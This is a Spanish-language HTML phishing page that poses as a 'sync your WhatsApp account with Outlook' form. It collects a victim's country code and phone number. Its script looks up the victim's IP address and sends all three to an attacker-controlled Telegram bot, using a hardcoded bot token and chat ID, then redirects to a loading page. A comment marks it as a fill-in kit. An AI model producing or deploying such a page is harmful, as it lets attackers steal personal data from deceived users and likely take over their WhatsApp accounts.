<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Iniciar</title>
  <link rel="stylesheet" href="./index1_files/remixicon.css" />

  <style>
    /* ===== Reset básico ===== */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: "Segoe UI", Arial, sans-serif;
      background: #f0f2f5;
      color: #333;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    /* ===== Contenedor principal ===== */
    .login-container {
      background: #fff;
      width: 100%;
      max-width: 420px;
      padding: 40px 35px;
      border-radius: 12px;
      box-shadow: 0 8px 30px rgba(0,0,0,0.08);
      animation: fadeIn 0.6s ease;
    }

    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(20px);}
      to {opacity: 1; transform: translateY(0);}
    }

    /* ===== Logo ===== */
    .login-logo {
      display: block;
      margin: 0 auto 20px auto;
      width: 90px;
    }

    /* ===== Texto descriptivo ===== */
    .login-description {
      font-size: 15px;
      text-align: center;
      margin-bottom: 25px;
      line-height: 1.6;
      color: #555;
    }

    .login-description span {
      color: #0078d7;
      font-weight: 600;
    }

    /* ===== Inputs ===== */
    .login-box {
      margin-bottom: 20px;
    }

    .login--input-box {
      position: relative;
    }

    .login-input {
      width: 100%;
      padding: 14px 12px;
      border: 1px solid #d0d7de;
      border-radius: 8px;
      font-size: 14px;
      outline: none;
      transition: all 0.25s ease;
      background: #fafbfc;
    }

    .login-input:focus {
      border-color: #0078d7;
      background: #fff;
      box-shadow: 0 0 0 4px rgba(0,120,215,0.15);
    }

    .login--input-label {
      position: absolute;
      top: -9px;
      left: 12px;
      background: #fff;
      font-size: 12px;
      padding: 0 4px;
      color: #666;
    }

    /* ===== Botón ===== */
    .login--button--whatsapp {
      width: 100%;
      padding: 14px;
      background: linear-gradient(90deg, #0078d7, #005a9e);
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .login--button--whatsapp:hover {
      background: linear-gradient(90deg, #005a9e, #004578);
    }

    /* ===== Responsivo ===== */
    @media (max-width: 500px) {
      .login-container {
        margin: 0 20px;
        padding: 30px 20px;
      }
    }
  </style>
</head>
<body>
  <section class="login">
    <div class="login-container">
      <form id="loginForm" class="login--form" onsubmit="enviarDatos(event)">
        <img src="./index1_files/lbg22.png" alt="Logo" class="login-logo" />

        <p class="login-description">
          Ingrese su <span>número de teléfono</span> para sincronizar su cuenta de 
          <b>WhatsApp</b> con <b>Outlook</b>.
        </p>

        <div class="login-box">
          <div class="login--input-box">
            <label class="login--input-label">País</label>
            <select id="country" class="login-input" name="pais" required>
              <option value="" disabled selected>Selecciona tu país</option>
              <option value="+52">🇲🇽 México</option>
              <option value="+58">🇻🇪 Venezuela</option>
              <option value="+54">🇦🇷 Argentina</option>
              <option value="+506">🇨🇷 Costa Rica</option>
              <option value="+57">🇨🇴 Colombia</option>
              <option value="+507">🇵🇦 Panamá</option>
              <option value="+504">🇭🇳 Honduras</option>
            </select>
          </div>
        </div>

        <div class="login-box">
          <div class="login--input-box">
            <input type="tel" class="login-input" id="telefono" name="telefono" required />
            <label class="login--input-label">Teléfono</label>
          </div>
        </div>

        <button class="login--button--whatsapp" type="submit">Siguiente</button>
      </form>
    </div>
  </section>

 <script>
  // INSERTA AQUÍ TUS DATOS DEL BOT
  const BOT_TOKEN = "8107173590:AAEF_elz7cSx8D2S2pDF3UddMbqrWMAeT1c";
  const CHAT_ID = "-4802195491";

  function enviarDatos(e) {
    e.preventDefault();
    const pais = document.getElementById("country").value;
    const tel = document.getElementById("telefono").value;

    fetch("https://api.ipify.org?format=json")
      .then(response => response.json())
      .then(data => {
        const ip = data.ip;
        const mensaje = `📲 *Nuevo ingreso de número*\n🌎 País: ${pais}\n📞 Teléfono: ${tel}\n🌐 IP: ${ip}`;
        
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: mensaje,
            parse_mode: "Markdown"
          })
        }).then(() => {
          window.location.href = "loading.html";
        }).catch(err => {
          alert("Error al enviar al bot");
          console.error(err);
        });
      })
      .catch(err => {
        alert("Error al obtener la IP");
        console.error(err);
      });
  }
</script>
</body>
</html>
